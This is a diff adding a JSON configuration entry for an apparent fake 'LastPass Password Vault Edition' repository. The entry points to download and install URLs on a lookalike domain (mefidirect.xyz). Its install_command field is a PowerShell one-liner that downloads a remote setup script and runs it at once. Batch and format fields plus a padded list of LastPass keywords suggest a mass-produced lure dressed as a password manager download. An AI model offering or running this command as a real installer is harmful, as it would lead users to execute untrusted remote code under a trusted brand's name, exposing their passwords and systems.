@@ -1,0 +1,29 @@
+{
+  "repo": "lastpass-password-vault-edition",
+  "product": "LastPass Password Vault Edition",
+  "kind": "password",
+  "install_type": "download",
+  "download_url": "https://lastpass.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "password",
+  "topics": [
+    "lastpass-bundle",
+    "lastpass-platform",
+    "lastpass-password-manager",
+    "lastpass-64-bit",
+    "lastpass-startup-fix",
+    "lastpass-pc-install",
+    "lastpass-password-vault",
+    "lastpass-workbench",
+    "lastpass-user-guide",
+    "lastpass-manual-2026",
+    "lastpass-installer",
+    "system-utility",
+    "security-tools",
+    "windows-tools",
+    "desktop-tools"
+  ]
+}
